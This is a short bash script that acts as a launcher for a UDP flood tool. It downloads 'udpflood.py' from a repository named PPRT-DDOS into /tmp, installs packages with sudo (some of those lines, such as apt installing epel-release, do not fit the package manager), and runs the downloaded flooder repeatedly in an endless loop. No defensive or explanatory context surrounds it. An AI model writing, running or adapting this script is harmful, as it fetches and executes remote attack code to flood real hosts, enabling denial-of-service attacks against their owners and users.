#!/bin/bash
clear
wget -O /tmp/uwu.py 'https://raw.githubusercontent.com/fernandesrobert/PPRT-DDOS/master/udpflood.py'
chmod +x /tmp/uwu.py
sudo apt-get install epel-release -y
sudo apt-get install snapd -y
sudo apt-get install python38 -y
sudo apt-get install python -y
sudo apt-get install python38 -y
sudo systemctl enable --now snapd.socket
sudo ln -s /var/lib/snapd/snap /snap
sudo apt-get -y update
sudo apt-get -y upgrade
sudo snap install figlet
sudo apt-get -y install figlet
cd /tmp
clear
while true; do
    clear
    python3 uwu.py
    case $? in
    130) break ;;
    esac
    clear
    figlet Hit another time Ctrl + C to exit -f slant
    figlet You have 10 seconds -f smslant
    sleep 10
    clear
done
clear
